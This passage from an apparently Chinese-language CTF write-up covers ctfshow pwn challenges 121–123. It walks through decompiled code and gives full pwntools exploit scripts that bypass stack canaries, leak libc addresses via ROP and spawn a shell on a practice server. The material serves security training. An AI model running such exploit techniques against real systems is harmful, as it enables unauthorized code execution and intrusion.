class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仔细观察可以发现这里存在一个整形溢出，对输入+1后进行了无符号整形强制转换</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NzJkOTRiYTQ0YjlhNzA1NTgzOTc3YTdmM2I5ZDk1MTFfZzlzU01rRXlyOGNsQWxqZVU0aWZRM3ZkQXFvNnhaRklfVG9rZW46V1NKcGJ5cHNTb0V2OHZ4NEdnWWN0dHkwbjRjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>进而又有了一个栈溢出漏洞，同样的程序开启了Canary保护，还是要想办法绕过</p>
<p>这里我们就需要了解并利用异常机制去绕过Canary保护了（详细原理课程中会给大家讲解，这里不讲述原理）</p>
<p>我们现在需要跳过canary检查，如果异常被上一个函数的catch捕获，所以rbp变成了上一个函数的rbp， 而通过构造一个payload把上一个函数的rbp修改成stack_pivot地址， 之后上一个函数返回的时候执行leave ret，这样一来我们就能成功绕过canary的检查，而且进一步我们也能控制eip，，去执行了stack_pivot中的rop了。</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28201</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">message_pattern = <span class="number">0x6061C0</span></span><br><span class="line">puts_plt = <span class="number">0x400BD0</span></span><br><span class="line">puts_got = <span class="number">0x606020</span></span><br><span class="line">readn = <span class="number">0x400F1E</span>  </span><br><span class="line">pop_rdi = <span class="number">0x4044d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4044d1</span></span><br><span class="line">ret = <span class="number">0x40150c</span>   </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;option:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;No&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;-2&#x27;</span>)</span><br><span class="line">payload = p64(message_pattern)*<span class="number">37</span> + p64(ret)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(message_pattern + <span class="number">0x50</span>) + p64(pop_rsi_r15) + p64(<span class="number">1024</span>) + p64(message_pattern + <span class="number">0x50</span>) + p64(readn)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;pattern:\n&quot;</span>)</span><br><span class="line">puts = u64(io.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f302</span></span><br><span class="line">payload = p64(one_gadget)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="pwn-122"><a href="#pwn-122" class="headerlink" title="pwn 122"></a>pwn 122</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=OGE0ZmNmMWE4MzIxOTM5NjZkZDIxNTcwM2U4NWEzMDRfRk9wR01OTXVHQUhERDQ1RlRCaWI3UU9Ja0luTndOZXlfVG9rZW46UEI4UWIxZ3Z3b29EMkh4ZFgwOGNmSUh0bmJnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>32位开启Canary保护NX保护，部分开启RELRO</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_804866D();</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( sub_8048B2E() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v1 )</span><br><span class="line">          <span class="built_in">free</span>(v1);</span><br><span class="line">        v1 = (<span class="type">void</span> *)sub_8048B03(<span class="number">0x100u</span>);</span><br><span class="line">        sub_8048510(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v1 )</span><br><span class="line">          sub_8048780((<span class="type">char</span> *)v1);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v1 )</span><br><span class="line">          sub_8048823((<span class="type">char</span> *)v1);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v1 )</span><br><span class="line">          sub_80488C6((<span class="type">char</span> *)v1);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v1 )</span><br><span class="line">          sub_8048A70((<span class="type">char</span> *)v1);</span><br><span class="line">LABEL_17:</span><br><span class="line">        sub_8048510(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v1 )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_80484B0(<span class="string">&quot;The Flag is: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v1);</span><br><span class="line">          <span class="built_in">free</span>(v1);</span><br><span class="line">          v1 = <span class="number">0</span>;</span><br><span class="line">          sub_8048510(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          sub_8048510(<span class="string">&quot;You have to input flag first!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        sub_8048510(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_8048510(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看一下菜单：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=N2QwZDYwZmMwNDJkNzc3ODExNjA3YTE0ODA2MGI0N2Zfd0ltNGZpYzN3aGdMc081RVh3Q0hGR01YQ2VqODVQMlFfVG9rZW46SVp4SGJMbTZib3ZBcE14aDRoMWNaZTZFbjBkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>对应7个分支分别对应7个选项</p>
<p>跟进选项sub_80488C6：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_80488C6</span><span class="params">(<span class="type">char</span> *dest)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [esp+14h] [ebp-114h]</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// [esp+18h] [ebp-110h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [esp+1Ch] [ebp-10Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// [esp+11Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  v13 = src;</span><br><span class="line">  <span class="keyword">for</span> ( i = dest; *i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( *i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        v1 = v13++;</span><br><span class="line">        *v1 = <span class="number">52</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        v2 = v13++;</span><br><span class="line">        *v2 = <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">        v3 = v13++;</span><br><span class="line">        *v3 = <span class="number">51</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">        *v13 = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        v13[<span class="number">1</span>] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">        v4 = v13 + <span class="number">2</span>;</span><br><span class="line">        v13 += <span class="number">3</span>;</span><br><span class="line">        *v4 = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">        v5 = v13++;</span><br><span class="line">        *v5 = <span class="number">33</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">        v6 = v13++;</span><br><span class="line">        *v6 = <span class="number">49</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">        v7 = v13++;</span><br><span class="line">        *v7 = <span class="number">48</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        v8 = v13++;</span><br><span class="line">        *v8 = <span class="number">53</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">        v9 = v13++;</span><br><span class="line">        *v9 = <span class="number">55</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        v10 = v13++;</span><br><span class="line">        *v10 = <span class="number">50</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v11 = v13++;</span><br><span class="line">        *v11 = *i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到将选项1读入的flag，传入到选项4的sub_80488C6函数中，flag中只要含有h或者H字符就会变成三个字符-&gt; “1-1” ，可以利用这个进行栈溢出。然后函数结尾还有strcpy，将变换后的src字符串，拷贝到dest指向的内存位置。然后由于栈溢出覆盖了canary，所以函数最后会触发stack_chk_fail函数。可以利用栈溢出，strcpy，和触发stack_chk_fail函数，以及搜集的ROPgadget，进行getshell</p>
<p>可以进行验证一下：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NDZlM2ViOTE3YTZhMWIyOTQwMzgwYzg0MmM3ODVkNDRfMWxlN3hvbDA5a1RldGdjclZLMEsxRmFmQWVHWk5BRnFfVG9rZW46WUdZZ2JEV3ZNb3NSTEt4VmI4VmM5eVc0bndnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>其他的都是一个字符对应一个字符，只有h由原本的h变成了1-1</p>
<p>具体流程：</p>
<p>首先选1，输入flag，然后选4，将输入的flag中的h变成1-1字符串，在4选项进入的函数结尾处，strcpy，将ebp+8位置指向堆的指针地址，存到dest，将 从输入的flag中变化后的字符串 的起始地址传到src处， 将src处字符串拷贝到dest处 由于 可以将h字符变长造成栈溢出，所以可以覆盖ebp+8位置的地址， 覆盖为stack_chk_fail的got地址。 然后strcpy将src处的字符串拷贝到stack_chk_fail的got地址处。</p>
<p>这里可以通过构造出泄漏出puts函数的地址，然后进行常规的rop，当然，还有更加简单的方法，这里大家可以自行尝试</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28277)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/home/bit/libc/32bit/libc-2.23.so&#x27;)</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048B01</span></span><br><span class="line">pop_edi_ebp_ret = <span class="number">0x08048D8E</span></span><br><span class="line">leave_ret = <span class="number">0x080485D8</span></span><br><span class="line">puts = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">arg1 = <span class="number">0x804b01c</span></span><br><span class="line">readline = <span class="number">0x080486CB</span></span><br><span class="line">fix_printf = <span class="number">0x80484b6</span></span><br><span class="line">ret = <span class="number">0x0804846a</span> </span><br><span class="line">buf = <span class="number">0x0804BCF0</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(p32(ret) + <span class="string">&#x27;AAAAAAAA&#x27;</span> + p32(fix_printf) + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;H&#x27;</span>*<span class="number">85</span>  + p32(pop_ebp_ret) +  p32(arg1) +  p32(puts) + p32(pop_ebp_ret) + p32(puts_got) + p32(readline) + p32(pop_edi_ebp_ret) + p32(buf) + p32(<span class="number">0x01010101</span>) + p32(pop_ebp_ret) + p32(buf-<span class="number">4</span>) + p32(leave_ret) +<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">puts = u32(io.recvrepeat(<span class="number">0.5</span>)[:<span class="number">4</span>])</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload = p32(system) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="pwn-123"><a href="#pwn-123" class="headerlink" title="pwn 123"></a>pwn 123</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTRhYWViMTAxMDRlMjNmNmYyZTRkYzc3ZmIzYTE4MzZfdW5oeGp2NWtieG9LWHVhYXhlVDdXTjVqeWhqakE2MFVfVG9rZW46RlhjZ2JUSFNZb0ZzczB4SXA4bGNmRDVhbjhiXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>32位开启Canary保护NX保护，部分开启RELRO</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NjY0NzJjMTAzOTJjMjc4MWFkNjExODhkZDdkNjY3NTZfUlJRekpsaFB0NlgyYkJtaVJYaDlFSEgyWm1rMGN1Y1hfVG9rZW46UHV5dGJmRE4zbzJNZGZ4TWVaaWNRUWxEblBoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>着重看whoareyou,ctfshow,seeyou这三个函数：</p>
<p>Whoareyou():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MzNmNGRhOWJiYjE3NWIzYmVmMWVkMWRhNzA1NDI0MDRfSEc2R3FVYXRSZTd0SlcwY2tIbER4QzRmM2ZmNWJYS2NfVG9rZW46SVVMVmJydWNxbzRpYkV4N0pURWNEOXA0bmJnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>name在bss段：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y3ZTZhMzQ5ZWFiZDIwOTdkNzE1NzMxNzUzY2RmZDNfNkZFQnI4ejg4OVZkRVdvS3hVRUYyUjVXRWdTVWt0aW5fVG9rZW46SkZyRWJ6S0dGb0pROFp4dTdrOWNkckZpbjJmXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>ctfshow():</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3[<span class="number">11</span>]; <span class="comment">// [esp+10h] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">    v3[i + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;0 &gt; exit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1 &gt; edit number&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2 &gt; show number&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3 &gt; sum&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4 &gt; dump all numbers&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot; &gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v3);</span><br><span class="line">  <span class="keyword">switch</span> ( v3[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      result = __readgsdword(<span class="number">0x14u</span>) ^ v4;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Index to edit: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;How many? &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      v3[i + <span class="number">1</span>] = v2;</span><br><span class="line">      result = sub_8048990();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Index to show: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;arr[%d] is %d\n&quot;</span>, i, v3[i + <span class="number">1</span>]);</span><br><span class="line">      result = sub_8048990();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; 